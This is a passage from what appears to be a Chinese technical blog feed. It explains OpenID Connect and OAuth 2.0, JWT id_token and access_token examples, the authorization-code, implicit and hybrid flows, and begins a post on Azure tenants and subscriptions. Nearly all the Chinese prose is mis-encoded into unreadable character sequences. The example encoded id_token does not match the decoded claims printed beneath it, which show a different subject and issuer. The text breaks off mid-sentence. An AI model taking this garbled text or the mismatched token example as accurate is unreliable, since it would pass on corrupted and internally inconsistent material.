id_tokenï¼Œå¯ç›´æ¥ç”¨ä½œèº«ä»½æ ‡è¯†ï¼Œä¾›ç¬¬ä¸‰æ–¹ç¡®è®¤ç”¨æˆ·èº«ä»½ã€‚</p><p>JWT Token æ˜¯è¿™ä¸ªæ ·å­çš„ï¼š</p><pre class="language-none"><code class="language-none">eyJ0eXAiOiJKV1QiLA0KICJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJqb2UiLA0KICJleHAiOjEzMDA4MTkzODAsDQogImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlfQ.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk</code></pre><p>æ ¼å¼ä¸ºâ€œç‚¹åˆ† base64 ç¼–ç â€ï¼Œä¸€å…±ä¸‰æ®µï¼Œç¬¬ä¸€éƒ¨åˆ†å«ä½œ<strong>å¤´éƒ¨</strong>ï¼ˆJOSE Headerï¼‰ï¼Œç¬¬äºŒéƒ¨åˆ†å«ä½œ<strong>è·è½½</strong>ï¼ˆPayloadï¼‰ï¼Œç¬¬ä¸‰éƒ¨åˆ†å«ä½œ<strong>ç­¾å</strong>ï¼ˆSignatureï¼‰ã€‚å…¶ä¸­çš„ç­¾åæ ¹æ®å¤´éƒ¨ã€è·è½½å’Œä¸€ä¸ªå¯†é’¥è®¡ç®—å¾—å‡ºï¼Œä¸å¯ä¼ªé€ ã€‚</p><p>base64 è§£ç ä¹‹åæ˜¯è¿™æ ·å­çš„ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token string">"typ"</span><span class="token builtin class-name">:</span><span class="token string">"JWT"</span>, <span class="token string">"alg"</span><span class="token builtin class-name">:</span><span class="token string">"HS256"</span><span class="token punctuation">&#125;</span>.<span class="token punctuation">&#123;</span><span class="token string">"iss"</span><span class="token builtin class-name">:</span><span class="token string">"joe"</span>, <span class="token string">"exp"</span>:1300819380, <span class="token string">"http://example.com/is_root"</span>:true<span class="token punctuation">&#125;</span>.<span class="token operator">&lt;</span>ç­¾å<span class="token operator">></span></code></pre><p>æ€»ç»“æˆä¸€å¥è¯ï¼šOAuth 2.0 èƒ½åšçš„ OIDC éƒ½èƒ½åšï¼ŒOAuth 2.0 ä¸å…·å¤‡çš„è®¤è¯èƒ½åŠ›ï¼ŒOIDC ä¹Ÿå…·å¤‡ã€‚</p></div><h2 id="OIDC-åè®®çš„åº”ç”¨åœºæ™¯"><strong>OIDC åè®®çš„åº”ç”¨åœºæ™¯</strong></h2><div class="story post-story"><p>æ‰€æœ‰ä½¿ç”¨ OAuth 2.0 çš„åœºæ™¯éƒ½å¯ä»¥å‡çº§ä¸º OIDC åè®®ï¼ŒOIDC åè®®æ˜¯ OAuth 2.0 çš„è¶…é›†ã€‚ä»¥ä¸‹æ˜¯ä¸€äº› OIDC åè®®çš„åº”ç”¨åœºæ™¯ï¼š</p><ul><li>ç¤¾ä¼šåŒ–ç™»å½•åœºæ™¯ï¼Œç½‘ç«™ç™»å½•æ¡†ä¸Šå¸¸è§è®¸å¤šæŒ‰é’®ã€Œä½¿ç”¨ XXX ç™»å½•ã€ã€‚</li><li>ç‰©è”ç½‘è®¾å¤‡çš„èº«ä»½è®¤è¯å’Œæˆæƒã€‚</li><li>ä¼ä¸šå†…å¤šä¸ªåº”ç”¨ç»Ÿä¸€èº«ä»½ï¼Œå•ç‚¹ç™»å½•ã€‚</li><li>å¼€æ”¾å¹³å°å¯¹å¤–æš´éœ²åº”ç”¨æ•°æ®ï¼Œåšç”¨æˆ·è®¤è¯ä¸æˆæƒã€‚</li><li>Serverless ä¸­çš„èº«ä»½å±‚ã€‚</li></ul><p>OIDC åè®®æ˜¯ OAuth 2.0 åè®®çš„ä¸‹ä¸€ä»£ï¼Œæ˜¯èº«ä»½è®¤è¯åè®®å‡çº§çš„ä¸äºŒä¹‹é€‰ã€‚</p></div><h2 id="OIDC-åè®®ä¸­çš„å››ä¸ªä¸»ä½“"><strong>OIDC åè®®ä¸­çš„å››ä¸ªä¸»ä½“</strong></h2><div class="story post-story"><p>åœ¨ä»‹ç» OIDC æˆæƒæ¨¡å¼ä¹‹å‰ï¼Œå…ˆè¦æ˜ç¡®å››ä¸ªä¸»ä½“ï¼š<strong>ç¬¬ä¸‰æ–¹åº”ç”¨ã€èµ„æºæœåŠ¡å™¨ã€èµ„æºæ‰€æœ‰è€…ã€è®¤è¯æˆæƒæœåŠ¡å™¨</strong>ã€‚æˆ‘ä»¬ç»§ç»­æ²¿ç”¨å‰æ–‡äº¬ä¸œä¸ QQ ç™»å½•çš„ä¾‹å­ã€‚</p><p>P.S. QQ ä½¿ç”¨çš„æ˜¯å˜ç§ OAuth 2.0 åè®®ï¼Œå¹¶ä¸å®Œå…¨ç¬¦åˆ OIDC è§„èŒƒï¼Œåœ¨æ­¤å‡è®¾ QQ ä½¿ç”¨ OIDC åè®®è¿›è¡Œå¯¹å¤–æ•°æ®æˆæƒã€‚</p><p><strong>ç¬¬ä¸‰æ–¹åº”ç”¨</strong></p><p>äº¬ä¸œçš„è§’è‰²æ˜¯ç¬¬ä¸‰æ–¹åº”ç”¨ã€‚</p><p><strong>èµ„æºæœåŠ¡å™¨</strong></p><p>QQ çš„ä¸ªäººä¿¡æ¯å­˜æ”¾äºèµ„æºæœåŠ¡å™¨ã€‚</p><p><strong>èµ„æºæ‰€æœ‰è€…</strong></p><p>ç”¨æˆ·æ˜¯ QQ è´¦å·çš„æ‰€æœ‰è€…ã€‚</p><p><strong>è®¤è¯æˆæƒæœåŠ¡å™¨</strong></p><p>QQ çš„æˆæƒæœåŠ¡å™¨è´Ÿè´£ç”¨æˆ·çš„èº«ä»½è®¤è¯å’Œæˆæƒï¼Œç®¡ç†<strong>ç¬¬ä¸‰æ–¹åº”ç”¨</strong>ã€<strong>å—ä¿æŠ¤èµ„æº</strong>ã€<strong>èµ„æºæ‰€æœ‰è€…</strong>ä¹‹é—´çš„å…³ç³»ã€‚</p><p><img src="https://s2.loli.net/2021/12/19/QrWXwbmqOH7uSYc.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/19/QrWXwbmqOH7uSYc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211219153524610"></p></div><h2 id="OIDC-çš„ä¸‰ç§æˆæƒæ¨¡å¼"><strong>OIDC çš„ä¸‰ç§æˆæƒæ¨¡å¼</strong></h2><div class="story post-story"><h3 id="Authorization-Code-Flow"><strong>Authorization Code Flow</strong></h3><p>åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„æ˜¯<strong>æˆæƒç æ¨¡å¼</strong>ï¼Œæ­¤æ¨¡å¼çš„äº¤äº’è¿‡ç¨‹å¦‚ä¸‹å›¾**ï¼š**</p><p><img src="https://s2.loli.net/2021/12/19/Lam7RpZHjdVI2qk.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/19/Lam7RpZHjdVI2qk.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211219153612400"></p><ol><li>ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®è®¤è¯æœåŠ¡å™¨çš„æˆæƒé“¾æ¥ã€‚ï¼ˆç”¨æˆ·åœ¨äº¬ä¸œç½‘ç«™ç™»å½•æ¡†ç‚¹å‡»ä½¿ç”¨ QQ ç™»å½•ï¼‰</li><li>ç”¨æˆ·ä¸è®¤è¯æœåŠ¡å™¨å®Œæˆèº«ä»½è®¤è¯ã€‚ï¼ˆæµè§ˆå™¨è·³è½¬åˆ° QQ æˆæƒé¡µé¢ï¼Œç”¨æˆ·è¾“å…¥ QQ å·å’Œå¯†ç ï¼‰</li><li>è®¤è¯æœåŠ¡å™¨å‘ç¬¬ä¸‰æ–¹åº”ç”¨è¿”å›æˆæƒç  codeã€‚ï¼ˆQQ æœåŠ¡å™¨å°†ç”¨æˆ·çš„æµè§ˆå™¨é‡å®šå‘ï¼Œå°†æˆæƒç å‘é€åˆ°äº¬ä¸œæœåŠ¡å™¨ï¼‰</li><li>ç¬¬ä¸‰æ–¹åº”ç”¨æºå¸¦æˆæƒç è®¿é—®è®¤è¯æœåŠ¡å™¨çš„ token æ¥å£ã€‚ï¼ˆäº¬ä¸œæœåŠ¡å™¨æºå¸¦æˆæƒç ä¸ QQ æœåŠ¡å™¨äº¤äº’ï¼‰</li><li>è®¤è¯æœåŠ¡å™¨è¿”å› <strong>access_token</strong> å’Œ <strong>id_token</strong> ç»™ç¬¬ä¸‰æ–¹åº”ç”¨ã€‚ï¼ˆQQ æœåŠ¡å™¨è¿”å› access_token å’Œ id_token ç»™äº¬ä¸œæœåŠ¡å™¨ï¼‰</li></ol><p>æ­¤åï¼Œ<strong>ç¬¬ä¸‰æ–¹åº”ç”¨</strong>å¯ä»¥åˆ©ç”¨ access_token åˆ°<strong>èµ„æºæœåŠ¡å™¨</strong>è·å–ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå®Œæˆåœ¨ç¬¬ä¸‰æ–¹åº”ç”¨çš„æ³¨å†Œå’Œç™»å½•ä¸šåŠ¡ï¼Œå¹¶å¯ä»¥å°† <strong>id_token ä½œä¸ºç”¨æˆ·çš„èº«ä»½å‡­è¯</strong>ï¼Œå­˜æ”¾åœ¨å‰ç«¯ã€‚ç¬¬ä¸‰æ–¹åº”ç”¨çš„å‰ç«¯éœ€è¦è®¿é—®å—ä¿æŠ¤çš„èµ„æºï¼ˆä¾‹å¦‚ç”¨æˆ·è´¦å•ä¿¡æ¯ã€è´­ç‰©è½¦ï¼‰æ—¶éœ€è¦<strong>æºå¸¦ id_token</strong>ï¼Œ<strong>åç«¯éªŒè¯ id_token åˆæ³•æ€§</strong>ï¼Œæ ¸å®ç”¨æˆ·èº«ä»½ä¹‹åï¼Œè¿”å›ç›¸å…³èµ„æºæ•°æ®ã€‚</p><p><strong>OIDC è®¤è¯æ—¶ç›¸å…³ Token è§£é‡Š</strong></p><p>OIDC è®¤è¯æ—¶ä¼šç­¾å‘ä¸¤ç§ Tokenï¼Œä¸€ç±»å« id_tokenï¼Œè¿˜æœ‰ä¸€ç±»å«  access_tokenã€‚</p><ol><li><p>id_token æ˜¯<strong>ç”¨æˆ·èº«ä»½çš„å‡­è¯</strong>ï¼Œ<strong>åªèµ·åˆ°åˆ¤å®šç”¨æˆ·èº«ä»½</strong>çš„ä½œç”¨ã€‚</p><p>id_token ç¤ºä¾‹ï¼š</p></li></ol><pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI1ZTQ5NjBkZmJkOTE1OGZiODQ0OTAzYTkiLCJiaXJ0aGRhdGUiOiIiLCJmYW1pbHlfbmFtZSI6IiIsImdlbmRlciI6IiIsImdpdmVuX25hbWUiOiIiLCJsb2NhbGUiOiIiLCJtaWRkbGVfbmFtZSI6IiIsIm5hbWUiOiIiLCJuaWNrbmFtZSI6IiIsInBpY3R1cmUiOiJodHRwczovL3VzZXJjb250ZW50cy5hdXRoaW5nLmNuL2F1dGhpbmctYXZhdGFyLnBuZyIsInByZWZlcnJlZF91c2VybmFtZSI6IiIsInByb2ZpbGUiOiIiLCJ1cGRhdGVkX2F0IjoiIiwid2Vic2l0ZSI6IiIsInpvbmVpbmZvIjoiIiwiY29tcGFueSI6IiIsImJyb3dzZXIiOiJNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNF82KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODAuMC4zOTg3Ljg3IFNhZmFyaS81MzcuMzYiLCJkZXZpY2UiOiIiLCJsb2dpbnNfY291bnQiOjEsInJlZ2lzdGVyX21ldGhvZCI6ImRlZmF1bHQ6dXNlcm5hbWUtcGFzc3dvcmQiLCJibG9ja2VkIjpmYWxzZSwibGFzdF9pcCI6IjEyMS4yMS41Ni4xNzEiLCJyZWdpc3Rlcl9pbl91c2VycG9vbCI6IjVjOTU5MDU1NzhmY2U1MDAwMTY2Zjg1MyIsImxhc3RfbG9naW4iOiIyMDIwLTAyLTE2VDE1OjMzOjUyLjQ0NFoiLCJzaWduZWRfdXAiOiIyMDIwLTAyLTE2VDE1OjMzOjUxLjY2NVoiLCJlbWFpbCI6InRlc3QxQDEyMy5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsInBob25lX251bWJlciI6IiIsInBob25lX251bWJlcl92ZXJpZmllZCI6ZmFsc2UsImF0X2hhc2giOiJWYW9sSnVqWXltQjUxNlNGOGNaQkpBIiwic2lkIjoiZGYzMGFlNDgtOTkzMS00YjZlLWI0YzgtMWI5NjRkOGZjOWIyIiwiYXVkIjoiNWQwMWUzODk5ODVmODFjNmMxZGQzMWRlIiwiZXhwIjoxNTgxODcwOTc4LCJpYXQiOjE1ODE4NjczODEsImlzcyI6Imh0dHBzOi8vb2F1dGguYXV0aGluZy5jbi9vYXV0aC9vaWRjIn0.pH-bWm-Im0wnOcUEA-OG_iKwy9DTZlAXuik50HPsfGY</code></pre><p>â€‹è§£ç åï¼š</p><pre class="language-none"><code class="language-none">&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;.&#123;  &quot;sub&quot;: &quot;5e3a3b2315a0b8398cdaaa08&quot;,  &quot;birthdate&quot;: &quot;&quot;,  &quot;family_name&quot;: &quot;&quot;,  &quot;gender&quot;: &quot;&quot;,  &quot;given_name&quot;: &quot;&quot;,  &quot;locale&quot;: &quot;&quot;,  &quot;middle_name&quot;: &quot;&quot;,  &quot;name&quot;: &quot;&quot;,  &quot;nickname&quot;: &quot;&quot;,  &quot;picture&quot;: &quot;https:&#x2F;&#x2F;usercontents.authing.cn&#x2F;authing-avatar.png&quot;,  &quot;preferred_username&quot;: &quot;&quot;,  &quot;profile&quot;: &quot;&quot;,  &quot;updated_at&quot;: &quot;&quot;,  &quot;website&quot;: &quot;&quot;,  &quot;zoneinfo&quot;: &quot;&quot;,  &quot;company&quot;: &quot;&quot;,  &quot;browser&quot;: &quot;&quot;,  &quot;device&quot;: &quot;&quot;,  &quot;logins_count&quot;: 8,  &quot;register_method&quot;: &quot;default:username-password&quot;,  &quot;blocked&quot;: false,  &quot;last_ip&quot;: &quot;127.0.0.1&quot;,  &quot;register_in_userpool&quot;: &quot;5e3a3b2315a0b8398cdaaa04&quot;,  &quot;last_login&quot;: &quot;2020-02-16T09:04:09.764Z&quot;,  &quot;signed_up&quot;: &quot;2020-02-05T03:48:51.447Z&quot;,  &quot;email&quot;: &quot;test@test.com&quot;,  &quot;email_verified&quot;: false,  &quot;phone_number&quot;: &quot;&quot;,  &quot;at_hash&quot;: &quot;6k-IWJwh-Dd3_hLOay0s7A&quot;,  &quot;sid&quot;: &quot;d50a8c9d-23db-4156-80ea-1c82d199d0e9&quot;,  &quot;aud&quot;: &quot;5e3a3b2315a0b8398cdaaa0e&quot;,  &quot;exp&quot;: 1581948533,  &quot;iat&quot;: 1581944933,  &quot;iss&quot;: &quot;https:&#x2F;&#x2F;core.littleimp.cn&#x2F;oauth&#x2F;oidc&quot;&#125;.ç­¾å</code></pre><ol start="2"><li>access_token æ˜¯<strong>ç”¨æˆ·æˆæƒç»™ç¬¬ä¸‰æ–¹åº”ç”¨çš„ä¸€ä¸ªä»¤ç‰Œ</strong>ï¼Œç¬¬ä¸‰æ–¹åº”ç”¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè®¿é—®ç”¨æˆ·åœ¨èµ„æºæœåŠ¡å™¨ä¸Šå—ä¿æŠ¤çš„èµ„æºï¼Œä¸€èˆ¬<strong>ä¸ç”¨äºç”¨æˆ·å‡­è¯</strong>å’Œèº«ä»½æ ‡è¯†ã€‚</li></ol><p>â€‹access_token ç¤ºä¾‹ï¼š</p><pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJXaXdndEdHYzVMeGtZRUFRY012RFkiLCJzdWIiOiI1ZTNhM2IyMzE1YTBiODM5OGNkYWFhMDgiLCJpc3MiOiJodHRwczovL2NvcmUubGl0dGxlaW1wLmNuL29hdXRoL29pZGMiLCJpYXQiOjE1ODE5NDQ5MzMsImV4cCI6MTU4MTk0ODUzMywic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCBwaG9uZSIsImF1ZCI6IjVlM2EzYjIzMTVhMGI4Mzk4Y2RhYWEwZSJ9.MnAAGj6HlYvN3FOAo6PA2cxNxZDZbL3yhxTM3uxnt0M</code></pre><p>è§£ç åï¼š</p><pre><code>&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;.&#123;  &quot;jti&quot;: &quot;WiwgtGGc5LxkYEAQcMvDY&quot;,  &quot;sub&quot;: &quot;5e3a3b2315a0b8398cdaaa08&quot;,  &quot;iss&quot;: &quot;https://core.littleimp.cn/oauth/oidc&quot;,  &quot;iat&quot;: 1581944933,  &quot;exp&quot;: 1581948533,  &quot;scope&quot;: &quot;openid profile email phone&quot;,  &quot;aud&quot;: &quot;5e3a3b2315a0b8398cdaaa0e&quot;&#125;.ç­¾å</code></pre><h3 id="Implicit-Flow"><strong>Implicit Flow</strong></h3><p>åœ¨éšå¼æ¨¡å¼ä¸­ï¼Œè®¤è¯æœåŠ¡å™¨çš„æˆæƒæ¥å£ä¸ä¼šè¿”å›æˆæƒç  codeï¼Œè€Œæ˜¯åœ¨ä¸ç”¨æˆ·å®Œæˆè®¤è¯åè¿”å› id_token å’Œ access_tokenï¼Œäº¤äº’æ¨¡å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2021/12/19/W63sx8Ivwyl9CZH.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/19/W63sx8Ivwyl9CZH.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211219153927656"></p><ol><li>ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®è®¤è¯æœåŠ¡å™¨çš„æˆæƒé“¾æ¥ã€‚ï¼ˆç”¨æˆ·åœ¨äº¬ä¸œç½‘ç«™ç™»å½•æ¡†ç‚¹å‡»ä½¿ç”¨ QQ ç™»å½•ï¼‰</li><li>ç”¨æˆ·ä¸è®¤è¯æœåŠ¡å™¨å®Œæˆèº«ä»½è®¤è¯ã€‚ï¼ˆæµè§ˆå™¨è·³è½¬åˆ° QQ æˆæƒé¡µé¢ï¼Œç”¨æˆ·è¾“å…¥ QQ å·å’Œå¯†ç ï¼‰</li><li>è®¤è¯æœåŠ¡å™¨å‘ç¬¬ä¸‰æ–¹åº”ç”¨è¿”å› id_token å’Œ access_tokenã€‚ï¼ˆQQ æœåŠ¡å™¨å°†ç”¨æˆ·çš„æµè§ˆå™¨é‡å®šå‘ï¼Œå°† id_token access_token å‘é€åˆ°äº¬ä¸œå‰ç«¯é¡µé¢ï¼‰</li></ol><p>éšå¼æ¨¡å¼æ¯”æˆæƒç æ¨¡å¼ç®€å•ï¼Œç»å¸¸ç”¨äºå°† id_tokenã€access_token <strong>ç›´æ¥è¿”å›åˆ°å‰ç«¯</strong>ï¼Œæ–¹ä¾¿å‰ç«¯ç›´æ¥å­˜å‚¨ id_token ç”¨äºè¯æ˜ç”¨æˆ·èº«ä»½ã€‚ä¹Ÿéœ€è¦å‰ç«¯è‡ªè¡Œå°† access_token å‘å›åç«¯ï¼Œåç«¯ç”¨äºè·å–ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¿™å¢åŠ äº†<strong>æš´éœ² access_token çš„é£é™©ã€‚<strong>éšå¼æ¨¡å¼</strong>ä¸æ”¯æŒè¿”å› refresh_token</strong>ï¼Œå³ä¸èƒ½ä»åç«¯åˆ·æ–° access_tokenï¼Œç™»å½•ä¸€æ—¦è¿‡æœŸéœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•ã€‚</p><h3 id="Hybrid-Flow"><strong>Hybrid Flow</strong></h3><p>æ··åˆæ¨¡å¼æ˜¯ä»¥ä¸Šä¸¤ç§æ¨¡å¼çš„ç»„åˆï¼Œç‰¹ç‚¹æ˜¯èƒ½å¤Ÿåœ¨æˆæƒæ¥å£<strong>ä¸€æ¬¡æ€§è·å–åˆ°</strong> codeã€id_tokenã€access_tokenï¼Œä¸€èˆ¬ code ä¼šä¸ id_tokenã€access_token æ··åˆå‡ºç°ï¼Œæ··åˆæ¨¡å¼çš„äº¤äº’å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2021/12/19/cW2RgSCeY8q6FxN.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/19/cW2RgSCeY8q6FxN.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211219154035227"></p><ol><li>ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®è®¤è¯æœåŠ¡å™¨çš„æˆæƒé“¾æ¥ã€‚ï¼ˆç”¨æˆ·åœ¨äº¬ä¸œç½‘ç«™ç™»å½•æ¡†ç‚¹å‡»ä½¿ç”¨ QQ ç™»å½•ï¼‰</li><li>ç”¨æˆ·ä¸è®¤è¯æœåŠ¡å™¨å®Œæˆèº«ä»½è®¤è¯ã€‚ï¼ˆæµè§ˆå™¨è·³è½¬åˆ° QQ æˆæƒé¡µé¢ï¼Œç”¨æˆ·è¾“å…¥ QQ å·å’Œå¯†ç ï¼‰</li><li>è®¤è¯æœåŠ¡å™¨å‘ç¬¬ä¸‰æ–¹åº”ç”¨è¿”å› codeã€id_token å’Œ access_tokenã€‚ï¼ˆQQ æœåŠ¡å™¨å°†ç”¨æˆ·çš„æµè§ˆå™¨é‡å®šå‘ï¼Œå°† id_token access_token å‘é€åˆ°äº¬ä¸œå‰ç«¯é¡µé¢ï¼‰</li><li>ç¬¬ä¸‰æ–¹åº”ç”¨æºå¸¦æˆæƒç è®¿é—®è®¤è¯æœåŠ¡å™¨çš„ token æ¥å£ã€‚ï¼ˆäº¬ä¸œæœåŠ¡å™¨æºå¸¦æˆæƒç ä¸ QQ æœåŠ¡å™¨äº¤äº’ï¼‰</li><li>è®¤è¯æœåŠ¡å™¨è¿”å› <strong>access_token</strong> å’Œ <strong>id_token</strong> ç»™ç¬¬ä¸‰æ–¹åº”ç”¨ã€‚ï¼ˆQQ æœåŠ¡å™¨è¿”å› access_token å’Œ id_token ç»™äº¬ä¸œæœåŠ¡å™¨ï¼‰</li></ol><p>æ··åˆæ¨¡å¼å¯ä»¥çµæ´»æ»¡è¶³ codeã€id_tokenã€access_token çš„å„ç§å¤„ç†æ–¹å¼ï¼Œå¯ä»¥åœ¨äº«æœ‰éšå¼æ¨¡å¼ä¾¿åˆ©çš„åŒæ—¶ï¼Œåˆ©ç”¨ code è·å– refresh_tokenï¼Œä»è€Œå¯ä»¥åœ¨åç«¯åˆ·æ–°ç”¨æˆ· access_tokenï¼Œä¸å¿…é‡å¤è®©ç”¨æˆ·ç™»å½•ã€‚</p></div><h2 id="æ€»ç»“"><strong>æ€»ç»“</strong></h2><div class="story post-story"><p>OIDC åè®®æ˜¯ OAuth 2.0 åè®®çš„è¶…é›†ï¼Œæ˜¯å¯ä»¥æ›¿ä»£ OAuth 2.0 çš„ä¸‹ä¸€ä»£èº«ä»½è®¤è¯åè®®ï¼Œèƒ½å¤Ÿè§£å†³è®¤è¯ + æˆæƒä¸¤ä¸ªé—®é¢˜ã€‚OIDC çš„æˆæƒæµç¨‹ä¸ OAuth 2.0 å®Œå…¨ä¸€è‡´ï¼Œèƒ½å¤Ÿä¿æŒå‘ä¸‹å…¼å®¹ã€‚</p><p>æˆæƒæœåŠ¡å™¨çš„æ„ä¹‰åœ¨äºç®¡ç†<strong>ç¬¬ä¸‰æ–¹åº”ç”¨</strong>ã€<strong>å—ä¿æŠ¤èµ„æº</strong>ã€<strong>èµ„æºæ‰€æœ‰è€…</strong>ä¹‹é—´çš„å…³ç³»ï¼Œè®©äº’ç›¸ä¸ä¿¡ä»»çš„åº”ç”¨ä¹‹é—´å®‰å…¨åœ°æš´éœ²æ•°æ®â€”â€”åº”ç”¨ä¹‹é—´çº¦å®šå¥½æŸç§è§„èŒƒï¼ŒæŒ‰ç…§è¿™ç§è§„èŒƒï¼Œå°±èƒ½åœ¨ç”¨æˆ·æˆæƒçš„å‰æä¸‹ï¼Œå®‰å…¨åœ°å°†æ•°æ®æš´éœ²ç»™ç¬¬ä¸‰æ–¹ï¼Œ<strong>è€Œç¬¬ä¸‰æ–¹ä¹Ÿæ— éœ€è·çŸ¥ç”¨æˆ·çš„è´¦å¯†ä¿¡æ¯ã€‚</strong></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Azure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OIDC </tag>
            
            <tag> OAuth2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Azure Tenant,subscriptionçš„å…³ç³»</title>
      <link href="/posts/1bfddf42/"/>
      <url>/posts/1bfddf42/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1>Subscriptions, licenses, accounts, and tenants</h1><p>å¾®è½¯æä¾›äº†ç»„ç»‡ã€è®¢é˜…ã€è®¸å¯è¯å’Œç”¨æˆ·å¸æˆ·çš„å±‚æ¬¡ç»“æ„ï¼Œä»¥ä¾¿åœ¨å…¶äº‘äº§å“ä¸­ä¸€è‡´ä½¿ç”¨èº«ä»½å’Œè´¦å•</p><p><img src="https://s2.loli.net/2021/12/14/87bVk69BItDXlMg.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/14/87bVk69BItDXlMg.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211214210108770"></p><h2 id="Organization-tenantsç§Ÿæˆ·">Organization(tenantsç§Ÿæˆ·)</h2><div class="story post-story"><p>ç§Ÿæˆ·ä¸Azureç›¸å…³ï¼ŒæŒ‡çš„æ˜¯Azure Active Directoryçš„å•ä¸ªå®ä¾‹ï¼Œæˆ–è€…é€šå¸¸è¢«ç§°ä¸ºâ€œAzure ADâ€ã€‚Azure ADæ˜¯Microsoftçš„äº‘å¹³å°çš„å…³é”®éƒ¨åˆ†ï¼Œå› ä¸ºå®ƒæä¾›äº†ä¸€ä¸ªå•ä¸€çš„ä½ç½®æ¥ç®¡ç†ç”¨æˆ·ã€ç»„ä»¥åŠä»–ä»¬æ‰€æŒæœ‰çš„ä¸åœ¨Azure ADä¸­å‘å¸ƒçš„åº”ç”¨ç¨‹åºç›¸å…³çš„æƒé™ã€‚</p><p>Azure ADæä¾›çš„ä¸»è¦Microsoftåº”ç”¨ç¨‹åºåŒ…æ‹¬Office 365ã€Dynamics 365å’ŒAzureã€‚</p><p>æ¯ä¸ªAzure ADç§Ÿæˆ·éƒ½æ˜¯å…¨çƒå”¯ä¸€çš„ï¼Œé€šå¸¸ä½¿ç”¨ä»¥â€œ<a href="http://onmicrosoft.com">onmicrosoft.com</a>â€ç»“å°¾çš„åŸŸï¼ˆå³ <a href="http://myazuread.onmicrosoft.com">myazuread.onmicrosoft.com</a>ï¼‰ï¼Œå¹¶ä¸”æ¯ä¸ªç§Ÿæˆ·éƒ½æœ‰ä¸€ä¸ª UUID/GUID å½¢å¼çš„â€œç§Ÿæˆ· IDâ€ã€‚ç‹¬ç«‹äºå…¶ä»–çš„Azure AD ç§Ÿæˆ·ã€‚</p><p><font color='red'>ä¸€ä¸ªç§Ÿæˆ·å¯ä»¥å…³è”å¤šä¸ªè®¢é˜…ï¼Œä½†æ˜¯ä¸€ä¸ªè®¢é˜…åªèƒ½ä¸ªä¸€ä¸ªç§Ÿæˆ·ç»‘å®š</font></p><blockquote><p>é€šä¿—ç†è§£ç§Ÿæˆ·ï¼š<br>Azure ADæ˜¯ç”¨æ¥èº«ä»½è®¤è¯ç®¡ç†çš„ã€‚ç»„ç»‡ç”±å¤šä¸ªç”¨æˆ·ç»„æˆï¼Œå¦‚æœä¸€ä¸ªç»„ç»‡é‡Œçš„å¥½å¤šäººéƒ½éœ€è¦æ³¨å†Œç™»å½•ä½¿ç”¨ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆç§Ÿæˆ·å°†è¿™ä¸ªç»„ç»‡é‡Œçš„äººå’Œåº”ç”¨ç¨‹åºåœˆåœ¨ä¸€èµ·ï¼Œç§Ÿæˆ·é‡Œé¢æœ‰ç”¨æˆ·çš„AD ä»¥åŠ æ³¨å†Œè¿™ä¸ªåº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆè¿™ä¸ªç§Ÿæˆ·é‡Œé¢çš„äººå°±å¯ä»¥é€šè¿‡ADç™»å½•è¿›å»è¿™ä¸ªåº”ç”¨ç¨‹åºã€‚<br>å¤šç§Ÿæˆ·æŠ€æœ¯çš„å¥½å¤„åœ¨äºï¼š<br>1ï¼‰å¤šä¸ªç§Ÿæˆ·é‡Œé¢æœ‰ç›¸åº”çš„åº”ç”¨ç¨‹åºï¼Œåœ¨å¤šç§Ÿæˆ·æ„æ¶ä¸‹äº«æœ‰ä¸€æ ·çš„è½¯ä»¶ç¯å¢ƒï¼Œè¿™æ 